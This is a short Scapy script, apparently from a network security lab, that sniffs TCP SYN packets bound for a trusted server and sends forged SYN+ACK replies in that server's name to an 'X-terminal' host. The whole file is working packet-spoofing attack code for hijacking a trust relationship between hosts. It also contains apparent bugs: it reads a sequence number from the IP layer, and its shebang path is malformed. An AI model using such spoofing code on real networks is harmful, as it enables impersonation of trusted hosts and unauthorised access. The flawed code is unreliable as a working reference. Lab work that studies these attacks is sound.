#!usr/bin/python3
from scapy.all import *
import sys

X_terminal_IP = "10.9.0.5"
X_terminal_Port = 1023
Trusted_Server_IP = "10.9.0.6"
Trusted_Server_Port = 9090

def spoof_pkt(pkt):
	sequence = 378933595
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	if old_tcp.flags == "S":
		print("Sending Spoofed SYN+ACK Packet ...")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
		TCPLayer = TCP(sport=Trusted_Server_Port,dport=X_terminal_Port,flags="SA",
		 seq=sequence, ack= old_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0,iface="br-5429bb7a6ef2")

pkt = sniff(filter="tcp and dst host 10.9.0.6 and dst port 9090", prn=spoof_pkt,iface="br-5429bb7a6ef2")
